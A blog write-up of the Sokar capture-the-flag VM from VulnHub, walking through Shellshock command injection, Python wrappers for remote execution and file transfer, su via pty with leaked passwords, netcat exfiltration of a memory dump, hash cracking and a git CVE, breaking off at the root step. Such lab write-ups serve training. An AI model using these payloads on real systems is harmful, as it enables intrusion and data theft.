<p><a href="http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html">Vulnhub is 0b10</a> years old. That is binary for 2 :) In order to celebrate this, <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a>
 created <a href="https://www.vulnhub.com/entry/sokar-1,113/">Sokar</a>.</p>

<p> <img class="right <a" src="href="https://i.imgur.com/brPBCGq.png">https://i.imgur.com/brPBCGq.png</a>"></p>

<p>Sokar was used as another writeup competition (the first for 2015), similar to the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> challenge from Sep &lsquo;14.
From the <a href="http://blog.vulnhub.com/2015/01/competition-sokar.html">competition announcement blogpost</a>, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.</p>

<p>Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!</p>

<p>Here is my entry for the competition. Enjoy! :)</p>

<!-- more -->


<h2>a usual start</h2>

<p>You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire <code>nmap</code> at it. I followed exactly these steps apart from using the usual <code>netdiscover</code> to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.</p>

<p>I knew which interface the network was bound to on my Mac, so I started the sniffer with <code>sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1</code>:</p>

<p>```bash
leonjza@laptop » sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1</p>

<p>[&hellip; snip IPv6 talky talky &hellip;]</p>

<p>IP src 0.0.0.0         dst 255.255.255.255 UDP src port 68 dst port 67
IP src 192.168.217.254 dst 192.168.217.163 UDP src port 67 dst port 68
```</p>

<p><strong>192.168.217.163</strong>. Great. This will be our target for a <code>nmap</code> scan. Sokar did not respond to pings, but that is no biggie. I see this many times in real world networks too, so heh. Don&rsquo;t rely on ICMP traffic ;)</p>

<p>```bash
leonjza@kali/sokar $ nmap &mdash;reason 192.168.217.163 -p-</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-02-02 21:09 SAST

```</p>

<p>One port open on tcp. <code>tcp/591</code>.</p>

<h2>/cgi-bin/cat</h2>

<p>The service on <code>tcp/591</code> appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML <code>&lt;iframe&gt;</code> to <a href="http://192.168.217.163:591/cgi-bin/cat.">http://192.168.217.163:591/cgi-bin/cat.</a> Requesting this page alone was the same stats, minus that creepy pink color ;)</p>

<p><img class="<a" src="href="https://i.imgur.com/nAoNCnK.png">https://i.imgur.com/nAoNCnK.png</a>"></p>

<p>I toyed around quite a bit with this webserver. The textbook approach of running <code>wfuzz</code> to discover some web paths, <code>nikto</code> to discover some interesting information etc. was used. Alas, none of these tools proved really useful.</p>

<p>Applying some more brain thingies to my current situation, I remembered the <a href="http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29">Shellshock</a> bug disclosed in September 2014. The <code>/cgi-bin</code> path was the biggest hint towards it. I also remembered <a href="https://twitter.com/mubix">@mubix</a> was keeping a Github repository of <a href="https://github.com/mubix/shellshocker-pocs">PoC&rsquo;s for shellshock</a>, and promptly started to try a few against the CGI path.</p>

<p>Eventually, <a href="https://gist.github.com/mfadzilr/70892f43597e7863a8dc">this</a> PoC was modified a little to get me some working command injection via shellshock:</p>

<p>```bash
leonjza@kali/sokar $ curl -i -X OPTIONS -H &ldquo;User-Agent: () { :;};echo;/usr/bin/id&rdquo; &ldquo;<a href="http://192.168.217.163:591/cgi-bin/cat">http://192.168.217.163:591/cgi-bin/cat</a>&rdquo;
HTTP/1.1 200 OK
Date: Mon, 02 Feb 2015 21:23:07 GMT
Server: Apache/2.2.15 (CentOS)
Connection: close
Transfer-Encoding: chunked
Content-Type: text/plain; charset=UTF-8</p>

<p>uid=48(apache) gid=48(apache) groups=48(apache)
```</p>

<p>Yay. I was now able to execute commands as <code>apache</code>. This allowed me to enumerate a great deal of the machine with relative ease.</p>

<h2>making life easier</h2>

<p>Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called <code>shock.py</code>):</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Sokar Shellshock Command Execution</h1>

<h1>2015 Leon Jacobs</h1>

<p>import requests
import sys</p>

<p>if len(sys.argv) &lt; 2:</p>

<pre><code>print " * Usage %s &lt;cmd&gt;" % sys.argv[0]
sys.exit(1)
</code></pre>

<h1>vuln@ curl -i -X OPTIONS -H &ldquo;User-Agent: () { :;};echo;/bin/cat /etc/passwd&rdquo; &ldquo;<a href="http://192.168.217.163:591/cgi-bin/cat">http://192.168.217.163:591/cgi-bin/cat</a>&rdquo;</h1>

<p>command = sys.argv[1].strip()
print &ldquo; * Executing %s\n&rdquo; % command</p>

<h1>prepare the sploit header</h1>

<p>headers = { &ldquo;User-Agent&rdquo;: &ldquo;() { :;};echo;%s&rdquo; % command }
print requests.get(&ldquo;<a href="http://192.168.217.163:591/cgi-bin/cat">http://192.168.217.163:591/cgi-bin/cat</a>&rdquo;, headers=headers).text.strip()
```</p>

<p>Using the above script, I could now just do <code>python shock.py "/usr/bin/id"</code>:</p>

<p>```bash
leonjza@kali/sokar $ python shock.py &ldquo;/usr/bin/id&rdquo;
 * Executing /usr/bin/id</p>

<p>uid=48(apache) gid=48(apache) groups=48(apache)
```</p>

<p>During the initial enumeration phase, I tried to build myself a reverse shell. I confirmed that <code>netcat</code> was available and that <code>apache</code> was allowed to execute it, however, all of my attempts failed. <code>SELinux</code> was disabled so that was not the problem. Eventually I started wondering about egress fire-walling and decided that it was time for a outbound port scan!</p>

<p>I was able to write to <code>/tmp</code>, but for some reason I was having a really hard time getting newlines and quotes escaped so that I could essentially <code>echo &lt;script source&gt; &gt;&gt; /tmp/port_scan.py</code>. Eventually I resorted to writing a helper called <code>transfer.py</code> that was used to copy files over from my local Kali Linux install to the Sokar VM. In the long run, this made it really easy to copy scripts and tools over to Sokar:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Sokar Shellshock File Transfer</h1>

<h1>2015 Leon Jacobs</h1>

<p>import requests
import sys
import os
import binascii</p>

<p>def do_command(command):</p>

<pre><code>headers = { "User-Agent": "() { :;};echo;%s" % command }
r = requests.options("http://192.168.217.163:591/cgi-bin/cat", headers=headers)

if not r.status_code == 200:
    raise Exception(" ! Command %s failed")
</code></pre>

<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>

<pre><code>if len(sys.argv) &lt; 3:

    print " * Usage %s &lt;source&gt; &lt;destination&gt;" % sys.argv[0]
    sys.exit(1)

# vuln@ curl -i -X OPTIONS -H "User-Agent: () { :;};echo;/bin/cat /etc/passwd" "http://192.168.217.163:591/cgi-bin/cat"
source = sys.argv[1].strip()
destination = sys.argv[2].strip()
print " * Starting transfer of local '%s' to remote '%s'" % (source, destination)

hex_destination_file = "/tmp/" + binascii.b2a_hex(os.urandom(15)) + ".txt"
print " * Temp file on remote will be: %s" % hex_destination_file

# prepare a hex version of the local file
with open(source) as f:
    source_file = f.read()

# encode and split the source into chunks of 60
source_file = source_file.encode('hex')
source_data = {}
source_data = [source_file[i:i+60] for i in range(0, len(source_file), 60)]

print " * Transferring %d chunks to %s" % (len(source_data), hex_destination_file)
iteration = 1
for chunk in source_data:

    # check if it is start of file or append
    if iteration == 1:
        append = "&gt;"
    else:
        append = "&gt;&gt;"

    # prepare the command and run it
    command = "echo '%s' %s %s" % (chunk, append, hex_destination_file)
    do_command(command)

    print " * Chunk %d/%d transferred" % (iteration, len(source_data))
    iteration += 1

print " * Decoding hex on remote"
command = "/usr/bin/xxd -r -p %s &gt; %s" % (hex_destination_file, destination)
do_command(command)

print " * Cleaning up temp file %s" % hex_destination_file
command = "/bin/rm -f %s" %  hex_destination_file
do_command(command)

print " * Local '%s' transferred to remote '%s'" % (source, destination)
</code></pre>

<p>```</p>

<h2>egress firewalls le-suck</h2>

<p>With the file transfer script done, I coded up a small &lsquo;port scanner&rsquo; (though all it really does is try to connect to a port and move on to the next within 0.1s):</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Sokar Egress Port Scanner</h1>

<h1>2015 Leon Jacobs</h1>

<p>import socket</p>

<p>for port in xrange(1, 65535):</p>

<pre><code>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(0.1)
print "Trying port %d" % port
sock.connect_ex(("192.168.217.174", port))
sock.close()
</code></pre>

<p>```</p>

<p>&hellip; and transferred it to Sokar using my <code>transfer.py</code> script:</p>

<p><code>bash
leonjza@kali/sokar $ python transfer.py port_scan.py /tmp/port_scan.py
 * Starting transfer of local 'port_scan.py' to remote '/tmp/port_scan.py'
 * Temp file on remote will be: /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Transferring 10 chunks to /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Chunk 1/10 transferred
 * Chunk 2/10 transferred
 * Chunk 3/10 transferred
 * Chunk 4/10 transferred
 * Chunk 5/10 transferred
 * Chunk 6/10 transferred
 * Chunk 7/10 transferred
 * Chunk 8/10 transferred
 * Chunk 9/10 transferred
 * Chunk 10/10 transferred
 * Decoding hex on remote
 * Cleaning up temp file /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Local 'port_scan.py' transferred to remote '/tmp/port_scan.py'
</code></p>

<p>I also opened up a <code>tcpdump</code> on my local Kali Linux VM, filtering out <code>tcp/591</code> as well as <code>arp</code> traffic:</p>

<p>```bash
leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes</p>

<p>```</p>

<p>Finally, I fired the scanner off using the previously developed <code>shock.py</code> script:</p>

<p>```bash
leonjza@kali/sokar $ python shock.py &ldquo;/usr/bin/python /tmp/port_scan.py&rdquo;
 * Executing /usr/bin/python /tmp/port_scan.py</p>

<p>```</p>

<p>I waited&hellip; a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the <code>tcpdump</code> had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.</p>

<h2>bynarr the fruit</h2>

<p>Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that <code>/home/bynarr</code> was readable to me. In there was what looked like a kernel module <code>lime.ko</code> and a script called <code>lime</code> to <code>insmod</code> it. Both were owned by root:</p>

<p>```bash
leonjza@kali/sokar $ python shock.py &ldquo;/bin/cat /home/bynarr/lime&rdquo;
 * Executing /bin/cat /home/bynarr/lime</p>

<h1>!/bin/bash</h1>

<h1>echo &ldquo;&rdquo;"</h1>

<h1>Linux Memory Extractorator</h1>

<p>&ldquo;
echo "LKM, add or remove?&rdquo;
echo -en &ldquo;> &rdquo;</p>

<p>read -e input</p>

<p>if [ $input == &ldquo;add&rdquo; ]; then</p>

<pre><code>/sbin/insmod /home/bynarr/lime.ko "path=/tmp/ram format=raw"
</code></pre>

<p>elif [ $input == &ldquo;remove&rdquo; ]; then</p>

<pre><code>/sbin/rmmod lime
</code></pre>

<p>else</p>

<pre><code>echo "Invalid input, burn in the fires of Netu!"
</code></pre>

<p>fi</p>

<p>```</p>

<p>I knew that the chances were slim that it would allow me to run <code>insmod</code> as <code>apache</code>, but ofc I tried running the script regardless. Due to the fact that the file called <code>/tmp/ram</code> was not created after running <code>python shock.py "echo \"add\" | /home/bynarr/lime"</code>, I assumed it failed.</p>

<p>Later, some more enumeration finally got me to <code>/var/spool/mail/bynarr</code> with a message with the following contents:</p>

<p>```text
leonjza@kali/sokar $ python shock.py &ldquo;/bin/cat /var/spool/mail/bynarr&rdquo;

Subject: Welcome</p>

<p>Dear Bynarr.  Welcome to Sokar Inc. Forensic Development Team.
A user account has been setup for you.</p>

<p>UID 500 (bynarr)
GID 500 (bynarr)</p>

<pre><code>501 (forensic)
</code></pre>

<p>Password &lsquo;fruity&rsquo;.  Please change this ASAP.
Should you require, you&rsquo;ve been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out for analysis.</p>

<p>All the best in your new role!</p>

<p>  -Sokar-
```</p>

<p>I confirmed that <code>bynarr</code> was in the groups mentioned in the mail:</p>

<p>```bash
leonjza@kali/sokar $ python shock.py &ldquo;/usr/bin/id bynarr&rdquo;
 * Executing /usr/bin/id bynarr</p>

<p>uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
```</p>

<p>What confused me here was the mention of <em>&ldquo;outbound ephemeral port access on 51242&rdquo;</em>. I reduced my port scanners range to only scan from 51240 to 51250 to confirm this. I transferred the updated port scanner to Sokar, opened up a new <code>tcpdump</code> session and waited anxiously. <code>tcp/51242</code> outbound still appeared to be closed.</p>

<p>Of course, the most valuable piece of information was definitely the password <em>fruity</em>. Now, remember, I have a limited shell. Not a interactive one. I have been interfacing with Sokar only via python scripts which are executing commands via Shellshock HTTP requests.</p>

<p>Essentially, the easiest way for me to become <code>bynarr</code> (assuming <em>fruity</em> really is the password), would be to <code>su</code> right? Sounds like a 2 sec job. Well, it wasn’t :( Instead, I got caught up in a whole bunch of interesting situations where <code>su</code> expects a password via <code>stdin</code>, requires a valid tty (which I don’t have) and will spawn a shell for me to interact with (which I can&rsquo;t). Quite some time later, I got closer to becoming <code>bynarr</code> with something like <code>echo fruity | su bynarr</code>. To add to the pain, my shellshock shell also did not have a proper environment, so I had to prefix most commands with their full paths. Luckily though <code>$(which id)</code> came in very handy and saved some time. In retrospect, I could have probably just exported <code>PATH</code> as required, but heh.</p>

<p>Fast forward some time, I came across <a href="http://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells">this</a> SANS blogpost, which details on the topic of some &lsquo;stealthy&rsquo; su shells. Most importantly, the example of <code>(sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"</code> got me the closest to <code>bynarr</code>. Toying around with this a little, I realized that for some reason, the <code>(</code> and <code>)</code> characters were messing around, so I replaced that section with some python too. After a whole bunch attempts, I eventually got this to work:</p>

<p><code>/usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);"</code></p>

<p>(Basically, spawn a tty; attempt to <code>su</code> specifying the command to run with <code>-c</code>, then 1 second later, echo <code>fruity</code> to the <em>Password</em> prompt and execute <code>id</code> as <code>bynarr</code>)</p>

<p>```bash
leonjza@kali/sokar $ python shock.py &ldquo;/usr/bin/python -c \"import time; time.sleep(1); print &lsquo;fruity&rsquo;\&rdquo; | /usr/bin/python -c \&ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;id&rsquo;, &lsquo;bynarr&rsquo;]);\&rdquo;&ldquo;
 * Executing /usr/bin/python -c "import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;id&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo;</p>

<p>Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
```</p>

<p>:D As this is actually a Shellshock request, the full <code>User-Agent</code> header therefore was:</p>

<p><code>text
() { :;};echo;/usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);"
</code></p>

<p>Again, constructing that every time I want to execute something as <code>bynarr</code> would have been le-suck, so I made another wrapper script:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Sokar &lsquo;bynarr&rsquo; command execution</h1>

<h1>2015 Leon Jacobs</h1>

<p>import requests
import sys</p>

<p>if len(sys.argv) &lt; 2:</p>

<pre><code>print " * Usage %s &lt;cmd&gt;" % sys.argv[0]
sys.exit(1)
</code></pre>

<p>command = sys.argv[1].strip()
payload = &ldquo;&rdquo;&ldquo;/usr/bin/python -c "import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;%s&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo; &ldquo;&rdquo;&ldquo; % command
print &rdquo; * Executing %s\n" % payload</p>

<h1>prepare the sploit header</h1>

<p>headers = { &ldquo;User-Agent&rdquo;: &ldquo;() { :;};echo;%s&rdquo; % payload }
print requests.get(&ldquo;<a href="http://192.168.217.163:591/cgi-bin/cat">http://192.168.217.163:591/cgi-bin/cat</a>&rdquo;, headers=headers).text.strip()
```</p>

<p>All I have to do to get the output of <code>id</code> is provide it as a argument to <code>bynarr.py</code>:</p>

<p>```bash
leonjza@kali/sokar $ python bynarr.py &ldquo;id&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;id&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo;</p>

<p>Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
```</p>

<h2>the scary linux memory extractor</h2>

<p>With command access as <code>bynarr</code> and remembering the mention of <code>tcp/51242</code> outbound connectivity, I once more try and run the port scanner that got copied to <code>/tmp</code>:</p>

<p>```bash
leonjza@kali/sokar $ python bynarr.py &ldquo;/usr/bin/python /tmp/port_scan.py&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;/usr/bin/python /tmp/port_scan.py&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo;</p>

```</p>

</code></p>

<p>&hellip; I finally see something coming out of Sokar!
So <code>bynarr</code> is able to talk out on <code>tcp/51242</code>. Wut. Taking a few moments to think about this, I remembered that <code>iptables</code> is able to filter by user id using the <code>owner</code> module. At this stage, this was the only thing that made sense why <code>apache</code> would not be able to talk out on this port, but <code>bynarr</code> can.</p>

<p>So with that out the way, it was time to focus on this <code>lime</code> thing. <code>bynarr</code> was allowed to run <code>/home/bynarr/lime</code> as root via <code>sudo</code> without a password (as I suspected for the <code>insmod</code>):</p>

<p>```bash
leonjza@kali/sokar $ python bynarr.py &ldquo;sudo -l&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;sudo -l&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo;</p>

<p>I had no freaking idea what <code>lime</code> even really is, so, to the Gooooogles I went and came across this: <a href="https://github.com/504ensicsLabs/LiME">https://github.com/504ensicsLabs/LiME</a>. A forensics tool thingy thing. It seems like I will get to crawl through a dump of the current memory. Cool ;p</p>

<p>I ran the script to <code>insmod</code> the <code>lime.ko</code>, this time with <code>sudo</code>:</p>

<p>```bash
leonjza@kali/sokar $ python bynarr.py &ldquo;echo \"add\&rdquo; | sudo /home/bynarr/lime"
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;echo "add&rdquo; | sudo /home/bynarr/lime&rsquo;, &lsquo;bynarr&rsquo;]);"</p>

<h1>Linux Memory Extractorator</h1>

<p>LKM, add or remove?</p>

<blockquote></blockquote>

<p>```</p>

<p>I checked <code>/tmp</code> for the existence of the <code>ram</code> file and it was present. Looks like it worked :D. A quick note here. When I imported the VM initially, I upped the memory to 2GB. It was set to only have 256Mb by default which I thought was a little low. Sokar has limited disk space, so I was not getting the full memory dump. When I eventually noticed this, I reduced it back to the initial 256Mb and worked from there.</p>

<p>Remembering the outbound port access, I opened a netcat listener on my local Kali linux to redirect a incoming file to a local <code>ram</code> file with <code>nc -lvp 51242 &gt; ram</code>. Then, using my wrapper script <code>bynarr.py</code> again, I redirected the <code>/tmp/ram</code> file out over the netcat connection with: <code>python bynarr.py "/usr/bin/nc 192.168.217.174 51242 &lt; /tmp/ram"</code>. I now had a memory dump of Sokar on my local Kali Linux.</p>

<p>It was at this stage that I went down the wrong rabbit hole. <a href="https://code.google.com/p/volatility/">Volatility</a> was the first thing that came to mind when I saw this speak of memory dumps and what not. Having always just had this on my todo list, I figured that this was the perfect opportunity to finally give it a spin. I followed most of the docs to try and match the exact same kernel version as Sokar had (I have a number of CentOS VM&rsquo;s) and prepared a profile as required. Short version, it failed. I was not able to get Volatility to give me anything useful. Eventually I reconsidered my approach and went back to trusty &lsquo;ol <code>strings</code>.</p>

<p>I had to think a bit about what could possibly be useful in memory for me now. I noticed the user <code>apophis</code> had a home directory that I have not yet been able to access, so I promptly grepped the ram image for this user:</p>

<p>```bash
leonjza@kali/sokar $ strings ram | grep apophis</p>

<p>[&hellip; snip &hellip;]</p>

<p>apophis:[snip]0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
```</p>

<p>&hellip; <strong>wut</strong>. Why&hellip; wait a sec. Why the heck is a password hash in memory now. Dont think there has been any activity for this user yet&hellip; but clearly I don’t understand half of the technicalities here :( But hey. Lets run it through <code>john</code>:</p>

<p><code>bash
leonjza@kali/sokar $ john passwd --wordlist=/usr/share/wordlists/rockyou.txt

</code></p>

<p><code>apophis:overdrive</code>.</p>

<h2>build the clone to the hook</h2>

<p>To get command execution as <code>apophis.py</code> I copied the <code>bynarr.py</code> script to make <code>apophis.py</code>, changing the username and the password.</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;id&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;id&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
uid=501(apophis) gid=502(apophis) groups=502(apophis)
```</p>

<p>There we go! Command execution as <code>apophis</code> :) In <code>/home/apophis</code> there was a suid (for <code>root</code>) binary called <code>build</code>:</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;ls -lah /home/apophis&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;ls -lah /home/apophis&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

```</p>

<p>I thought I would copy this <code>build</code> binary off the box as I don’t exactly have a nice interactive shell to work with yet. <code>apophis</code> was also not able to to connect via <code>tcp/51242</code> outbound, which further confirmed my suspicions on the <code>user</code> module being used in iptables. I copied the binary to <code>/tmp/build</code> and pushed it out via netcat as <code>bynarr</code> (using my helper script) towards my local Kali linux install. Finally I had <code>build</code> locally to play with.</p>

<p>I later noticed it was a 64bit binary, so I had to move it over to my 64bit install of Kali Linux to inspect further.
Running it asked you if you wanted to &lsquo;build?&rsquo;:</p>

<p><code>bash
leonjza@kali/sokar $ ./build
Build? (Y/N) Y
Cloning into '/mnt/secret-project'...
ssh: Could not resolve hostname sokar-dev:: Name or service not known
fatal: The remote end hung up unexpectedly
</code></p>

<p>That looks very much like the output of a git clone attempt. Knowing what the binary expects now, I continued to run this on Sokar via my Shellshock wrapper for <code>apophis</code>:</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;echo Y | /home/apophis/build&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;echo Y | /home/apophis/build&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
Cloning into &lsquo;/mnt/secret-project&rsquo;&hellip;
ssh: Could not resolve hostname sokar-dev: Temporary failure in name resolution
fatal: Could not read from remote repository.</p>

<p>Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
```</p>

<p>The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to <code>/mnt/secret-project</code> from <code>sokar-dev</code> which does not resolve.</p>

<h3>the impossible b0f</h3>

<p>I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to <code>build.</code>:</p>

<p><code>bash
leonjza@kali/sokar $ ./build

</code></p>

<p>I slapped <code>build</code> into <code>gdb</code> to take a closer look at the potential overflow as well as the security features that <code>build</code> has been compiled with:</p>

<p><code>bash
leonjza@kali/sokar $ gdb -q ./build
Reading symbols from /root/sokar/build...(no debugging symbols found)...done.

<p>:O The <code>CANARY</code> explains the failure in <code>__fortify_fail</code>. Disassembly of the <code>main</code> function reveals a call to <code>__gets_chk</code> which is responsible for the canary validation:</p>

<p>```bash
gdb-peda$ disass main

```</p>

<p>It is possible that the original source was using <code>gets()</code> without a bounds check, but is compiled with SSP. This coupled with the fact that it is a 64bit binary and Sokar having ASLR enabled, made my head hurt. In fact, I was very demotivated at this stage as exploitation under these scenarios is very difficult.</p>

<p>I fiddled around a little more with the binary, and inspected the call to <code>encryptDecrypt</code>:</p>

</code></p>

<p>This together with pseudo code generated by Hopper helped me understand the encryptDecrypt function running a xor with <strong>I</strong> as the key over a string.</p>

<p>```c
void encryptDecrypt(int arg0, int arg1) {</p>

<pre><code>rsi = arg1;
rdx = arg0;
LODWORD(r9) = 0x0;
r10 = arg0;
do {
        r8 = sign_extend_64(LODWORD(r9));
        asm{ repne scasb  };
        if (r8 &gt;= !0xffffffffffffffff - 0x1) {
            break;
        }
        *(int8_t *)(rsi + r8) = LOBYTE(LODWORD(*(int8_t *)(rdx + r8) &amp; 0xff) ^ 0x49);
        LODWORD(r9) = LODWORD(r9) + 0x1;
} while (true);
return;
</code></pre>

<p>}
```</p>

<p>Running the binary in <code>gdb</code> and setting a breakpoint before the <code>system()</code> call, we are able to inspect the 64bit registers, which cleanly reveal the encrypted <strong>and</strong> decrypted versions of the string to be executed.</p>

<p>Right before this call though, there is a instruction to <code>call   0x5555555547a0 &lt;setreuid@plt&gt;</code> to set the UID to 0. So, this brought me to the conclusion that <code>build</code> is running <code>/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/</code> as <code>root</code>. But what is so special about this?</p>

<h3>inspecting git</h3>

<p>I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a <code>git clone</code> as root? One of my first theories was that if I could get <code>sokar-dev</code> to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions <code>git</code> will honor really is the symlink and executable bits :(</p>

<p>Further enumeration while I was thinking about the possibilities revealed that <code>/mnt/</code> was actually mounted with the <code>vfat</code> filesystem!</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;mount; cat /etc/fstab&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;mount; cat /etc/fstab&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:

```</p>

<p>As you can see, <code>/mnt</code> also specified the uid/gid for files on the mount, so even if I <em>were</em> able to get a suid shell onto the file system, root will not be the one owning it.</p>

<p>However. <code>vfat</code>. Why <code>vfat</code>&hellip; Of course! <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9390">CVE-2014-9390</a>. The potential client side code execution bug in older <code>git</code> versions where a case insensitive filesystem may cause the <code>git</code> client to read hooks from <code>.Git/hooks</code> instead of <code>.git/hooks</code>. And, of course, <code>vfat</code> is a case insensitive filesystem, which makes for the perfect scenario to exploit this bug.</p>

<p>I checked up on the installed version of <code>git</code> on Sokar, just to make sure that it is in fact vulnerable:</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;git &mdash;version&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;git &mdash;version&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
git version 2.2.0
```</p>

<p>Great. <code>git</code> version 2.2.1 fixed this bug so we are in luck.</p>

<h2>rooting sokar</h2>

